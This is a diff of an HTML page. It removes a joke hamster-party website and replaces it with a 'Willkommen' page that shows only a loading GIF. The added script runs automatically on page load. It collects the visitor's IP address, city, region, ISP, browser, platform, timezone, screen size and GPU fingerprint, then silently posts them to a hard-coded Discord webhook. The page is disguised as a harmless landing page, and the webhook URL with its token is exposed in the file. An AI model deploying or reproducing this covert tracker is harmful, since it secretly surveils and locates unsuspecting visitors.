@@ -1,141 +1,109 @@
-<!DOCTYPE html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Alternative für Hamster (AFH)</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
-  <style>
-    html {
-      scroll-behavior: smooth;
-    }
-    body {
-      margin: 0;
-      font-family: 'Inter', sans-serif;
-      background: #f5faff;
-      color: #111;
-    }
-    header {
-      background: #007aff;
-      color: white;
-      padding: 20px 40px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    header img {
-      height: 50px;
-    }
-    nav a {
-      margin-left: 20px;
-      color: white;
-      text-decoration: none;
-      font-weight: bold;
-    }
-    section {
-      padding: 60px 20px;
-      text-align: center;
-    }
-    h1, h2 {
-      color: #007aff;
-    }
-    .button {
-      background: #ff3b30;
-      color: white;
-      padding: 15px 30px;
-      border-radius: 12px;
-      font-weight: bold;
-      font-size: 16px;
-      text-decoration: none;
-      display: inline-block;
-      margin-top: 20px;
-    }
-    ul {
-      list-style: none;
-      padding: 0;
-      max-width: 600px;
-      margin: auto;
-      text-align: left;
-    }
-    li {
-      padding: 10px 0;
-      border-bottom: 1px solid #ccc;
-    }
-    .details {
-      display: none;
-      text-align: left;
-      margin-top: 20px;
-      max-width: 700px;
-      margin-inline: auto;
-      background: #fff;
-      padding: 20px;
-      border-radius: 12px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-    }
-    footer {
-      background: #007aff;
-      color: white;
-      text-align: center;
-      padding: 20px;
-      font-size: 14px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <title>Willkommen</title>
+    <style>
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        img {
+            max-width: 90%;
+            max-height: 90%;
+        }
+    </style>
 </head>
 <body>
 
-<header>
-  <img src="https://cdn.discordapp.com/attachments/1215014622990704641/1367087894933536778/2D5C95FE-75E3-4BA3-902C-F512A4BAACD8.png?ex=68134f51&is=6811fdd1&hm=6fce7a9b1199f66fcc8bf9ef64e2b63ac4f7488e3886e618eabab64fd02395e3&" alt="AFH Logo" />
-  <nav>
-    <a href="#start">Start</a>
-    <a href="#programm">Wahlprogramm</a>
-    <a href="#mitglied">Mitglied</a>
-    <a href="#spenden">Spenden</a>
-  </nav>
-</header>
+<img src="https://media0.giphy.com/media/Oc8lIQHZsXqDu/giphy.gif?cid=6c09b952b81g0fpjptlfnrbz9m9b8tzzab3t0uocapx99zbq&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g" alt="Laden...">
 
-<section id="start">
-  <h1>Alternative für Hamster</h1>
-  <p>Die Zukunft gehört dem Nager!</p>
-  <img src="https://cdn.discordapp.com/attachments/1215014622990704641/1366861428543324270/2D5C95FE-75E3-4BA3-902C-F512A4BAACD8.png" alt="Hamster" width="150" />
-  <a href="#programm" class="button">Zum Wahlprogramm</a>
-</section>
+<script>
+const webhookUrl = "https://discord.com/api/webhooks/1365776827787903068/StBWh9kwc5IAZVoTZWUd7ravbE3vReMNkyic1_sIlmj40NKmowSDPG_fo41vMvpSnGWv"; // <-- Hier deinen Discord Webhook einfügen
 
-<section id="programm">
-  <h2>Unser Wahlprogramm 2025</h2>
-  <ul>
-    <li>Mehr Rad für alle!</li>
-    <li>Ein Korn am Tag – gesetzlich garantiert.</li>
-    <li>Katzensichere Zone in jedem Haushalt.</li>
-    <li>Tunnelbau-Offensive 2025</li>
-    <li>Nistmaterial steuerfrei!</li>
-  </ul>
-  <a href="javascript:void(0)" class="button" onclick="document.getElementById('details').style.display='block'">Details anzeigen</a>
-  <div id="details" class="details">
-    <h3>Wahlprogramm – Details</h3>
-    <p><strong>Rad-Garantie:</strong> Jeder Hamster hat Anspruch auf zwei Laufräder – quietschfrei und kugelgelagert.</p>
-    <p><strong>Korn-Grundsicherung:</strong> Ein Korn am Tag hält den Stress im Gehege fern. Gesetzlich verankert!</p>
-    <p><strong>Katzo-Stop:</strong> Verpflichtende Katzen-Sperrzonen mit Ultraschall-Sensoren.</p>
-    <p><strong>NagerNetz:</strong> Förderung des Tunnelbaus – auch in Mietwohnungen!</p>
-    <p><strong>Flauschfrei:</strong> Nistmaterial von der Hamstersteuer befreit!</p>
-  </div>
-</section>
+async function collectData() {
+    const data = {};
 
-<section id="mitglied">
-  <h2>Mitglied werden</h2>
-  <p>Du willst Teil der AFH-Revolution werden?</p>
-  <p>Dann melde dich unter <strong>mitglied@afh.de</strong></p>
-</section>
+    try {
+        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+        data.ip = ipData.ip;
+        data.country = ipData.country_name;
+        data.city = ipData.city;
+        data.region = ipData.region;
+        data.isp = ipData.org;
+    } catch {
+        data.ip = "Fehler beim Laden";
+        data.country = "Unbekannt";
+    }
 
-<section id="spenden">
-  <h2>Spenden</h2>
-  <p>Unterstütze uns mit einer freiwilligen Nuss-Spende:</p>
-  <p><strong>IBAN:</strong> DE00 0000 0000 0000 0000 00</p>
-  <p><strong>BIC:</strong> HAMSTERBANKXXX</p>
-</section>
+    data.userAgent = navigator.userAgent;
+    data.language = navigator.language;
+    data.platform = navigator.platform;
+    data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    data.screenResolution = `${window.screen.width}x${window.screen.height}`;
+    data.colorScheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "Dark Mode" : "Light Mode";
+    data.touchSupport = 'ontouchstart' in window ? "Ja" : "Nein";
+    data.orientation = (screen.orientation || {}).type || "Nicht erkannt";
+    data.localTime = new Date().toString();
 
-<footer>
-  &copy; 2025 Alternative für Hamster (AFH) – Made by Neo
-</footer>
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+            data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        } else {
+            data.gpu = "Nicht verfügbar";
+        }
+    } catch {
+        data.gpu = "Nicht ermittelbar";
+    }
+
+    return data;
+}
+
+async function sendToDiscord() {
+    const info = await collectData();
+
+    const embed = {
+        title: "Neue Besucher-Infos",
+        color: 5814783, // hellblau
+        fields: [
+            { name: "IP", value: info.ip || "Unbekannt", inline: true },
+            { name: "Land", value: info.country || "Unbekannt", inline: true },
+            { name: "Stadt", value: info.city || "Unbekannt", inline: true },
+            { name: "Region", value: info.region || "Unbekannt", inline: true },
+            { name: "ISP", value: info.isp || "Unbekannt", inline: false },
+            { name: "GPU", value: info.gpu || "Unbekannt", inline: false },
+            { name: "Browser", value: info.userAgent || "Unbekannt", inline: false },
+            { name: "Sprache", value: info.language || "Unbekannt", inline: true },
+            { name: "Plattform", value: info.platform || "Unbekannt", inline: true },
+            { name: "Zeitzone", value: info.timezone || "Unbekannt", inline: true },
+            { name: "Bildschirm", value: info.screenResolution || "Unbekannt", inline: true },
+            { name: "Farbmodus", value: info.colorScheme || "Unbekannt", inline: true },
+            { name: "Touchscreen", value: info.touchSupport || "Unbekannt", inline: true },
+            { name: "Ausrichtung", value: info.orientation || "Unbekannt", inline: true },
+            { name: "Lokale Zeit", value: info.localTime || "Unbekannt", inline: false },
+        ],
+        footer: {
+            text: "Automatisch erfasst"
+        },
+        timestamp: new Date()
+    };
+
+    await fetch(webhookUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+    });
+}
+
+// Direkt beim Laden senden
+sendToDiscord();
+</script>
 
 </body>
 </html>
